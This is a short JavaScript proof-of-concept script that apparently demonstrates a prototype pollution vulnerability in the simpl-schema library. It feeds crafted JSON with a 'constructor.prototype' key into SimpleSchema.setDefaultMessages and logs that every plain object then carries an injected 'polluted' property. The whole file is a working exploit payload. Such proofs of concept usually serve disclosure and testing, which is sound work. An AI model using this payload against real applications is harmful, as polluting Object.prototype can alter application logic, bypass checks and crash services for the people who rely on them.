Reflect.getPrototypeOf = () => false;
const SimpleSchema = require('simpl-schema').default;
let obj = {};
console.log({}.polluted);
SimpleSchema.setDefaultMessages(JSON.parse('{"constructor.prototype": {"polluted":"yes"}}'));
console.log({}.polluted);